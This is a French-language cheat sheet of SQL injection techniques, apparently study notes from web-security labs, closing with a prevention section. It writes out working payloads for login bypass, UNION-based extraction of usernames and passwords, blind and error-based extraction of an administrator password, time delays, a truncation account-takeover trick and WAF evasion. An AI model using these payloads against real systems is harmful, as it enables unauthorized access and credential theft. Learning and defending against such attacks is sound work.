# SQL Injection

## Les bases

Points de vigilance avant toute injection :

- **SGBDR** : la syntaxe change selon Oracle, MySQL, SQLite, PostgreSQL, Microsoft SQL Server.
- **Syntaxe** : attention aux caractères `--`, `'`, `||`, `~`.
- **Outils Burp** : Repeater et Intruder.
- **Scripting** : essentiel, plus fiable que l'Intruder de Burp.
- **CheatSheet** : https://portswigger.net/web-security/sql-injection/cheat-sheet

Payload de base :

```text
' || ( INJECTION ) --
```

### Voler des données cachées

Injecter une condition toujours vraie pour renvoyer toutes les lignes.

```text
'--
' OR 1=1--
```

### Contourner la logique de l'application

Commenter la vérification du mot de passe pour se connecter sans lui.

```text
administrator'--
```

## SQL Truncation

Vuln de stockage, pas d'injection (zéro métacaractère). MySQL non-strict tronque `VARCHAR(n)` en silence, et `=` complète avec des espaces. On duplique un compte existant (`admin`) avec son propre mot de passe.

Repérer : `login VARCHAR(n)` court, form register + contrôle d'unicité.

Pour `VARCHAR(12)` + cible `admin` :

```text
login=admin%20%20%20%20%20%20%201&password=monpass
```

`admin` + 7 espaces + `1` = 13 car. → passe l'unicité → tronqué à 12 (`admin` + 7 espaces) → `= 'admin'` par padding. Le `1` force le dépassement et survit au trim. **Pas de quotes.** Puis login `admin` / `monpass`.


## UNION attacks

### Déterminer le nombre de colonnes

Incrémenter jusqu'à l'erreur, ou ajouter des `NULL` jusqu'à ce que la requête passe.

```text
' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--
```

### Trouver une colonne d'un type donné

Placer une chaîne à la position testée ; l'absence d'erreur confirme le type texte.

```text
' UNION SELECT NULL,'a',NULL--
```

### Extraire des données intéressantes

```text
' UNION SELECT username, password FROM users--
```

### Extraire plusieurs valeurs dans une seule colonne

Concaténer les champs avec un séparateur.

```text
' UNION SELECT username || '~' || password FROM users--
```

### Récupérer la version de la base

```text
' UNION SELECT @@version--
```

### Lister le contenu de la base

Lister les tables puis les colonnes via `information_schema`. `SELECT *` ne marche pas toujours : cibler `table_name` / `column_name`.

```text
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

## Blind SQL

### Exploiter une réponse conditionnelle

Le `trackingId` est utilisé dans une requête dont le résultat change l'affichage (message « Welcome back » présent ou absent). On s'en sert comme oracle booléen.

1. **Confirmer la vulnérabilité** — une condition vraie garde le message, une fausse le supprime.

```text
' AND 1=1--    → vrai → "Welcome back"
' AND 1=0--    → faux → pas de message
```

2. **Confirmer l'existence de la table `users`** :

```text
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

3. **Confirmer l'utilisateur `administrator`** :

```text
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

4. **Énumérer le mot de passe** — tester la longueur, puis extraire caractère par caractère (à automatiser avec l'Intruder).

```text
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>20)='administrator'--
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--
```

## Injection SQL basée sur une erreur

### Exploiter une réponse conditionnelle

Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erreur = condition fausse. `FROM dual` est spécifique à Oracle.

1. **Confirmer la vulnérabilité** :

```text
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    → erreur
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    → pas d'erreur
```

2. **Confirmer la table `users`** :

```text
'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

3. **Confirmer l'utilisateur `administrator`** :

```text
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

4. **Longueur puis extraction du mot de passe** (Intruder sur `§position§` et `§caractère§`) :

```text
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

### Exploiter un message d'erreur verbeux

Quand la base renvoie le détail de l'erreur, l'exploiter pour lire des données.

1. Vérifier que le point est exploitable.
2. Vérifier la syntaxe :

```text
'--
```

3. Respecter les conditions de la requête.
4. Chercher les infos sensibles dans le message renvoyé.

### Exploiter avec les délais de réponse

Injecter un délai déclenché par la condition (temps de réponse = oracle). `pg_sleep` est spécifique à PostgreSQL. L'extraction se fait ensuite comme pour les réponses conditionnelles.

```text
'||pg_sleep(1)--
```

### Exploiter avec des techniques OAST (out-of-band)

Utiliser Burp Collaborator (Burp Suite Professional) pour recevoir une interaction réseau déclenchée par l'injection, quand aucune réponse n'est visible dans l'application.

### SQLi dans une requête XML — bypass de filtre (Hackvertor)

Le corps de la requête est du XML : injecter la SQLi dans un champ, puis encoder le payload avec l'extension Hackvertor (entités XML / hex) pour contourner la détection d'attaque (WAF). Le XML n'est que le transport, la vuln reste une SQLi.

```text
' UNION SELECT password FROM users WHERE username='administrator'--
```

## Prévention

### Requêtes paramétrées (prepared statements)

La structure SQL est compilée séparément des données ; la valeur fournie est toujours traitée comme littérale, jamais comme du code (`' OR 1=1--` reste une chaîne).

```python
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

### Éléments non paramétrables (table, colonne, ORDER BY)

Les `?` ne couvrent pas les identifiants : valider l'entrée contre une liste blanche stricte.

```python
ALLOWED_SORT_COLUMNS = {"price": "product_price", "name": "product_name", "date": "created_at"}
sort_column = ALLOWED_SORT_COLUMNS.get(user_input, "created_at")  # défaut sûr si absent
query = f"SELECT * FROM products ORDER BY {sort_column} ASC"
```

### ORM

Un ORM génère des requêtes préparées par défaut ; le risque revient dès qu'on utilise `.raw()` ou une concaténation manuelle.

```python
session.query(User).filter(User.name == user_input).all()
```

### Moindre privilège

Le compte applicatif n'est jamais root/sa/postgres et n'a pas les droits DDL (`DROP`, `ALTER`, `CREATE`).

```sql
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';
```

### Masquage des erreurs et journalisation

Message générique côté front (bloque l'error-based), exception réelle loggée côté serveur pour la détection.

```text
Front   : "Une erreur est survenue"
Serveur : log complet de l'exception SQL
```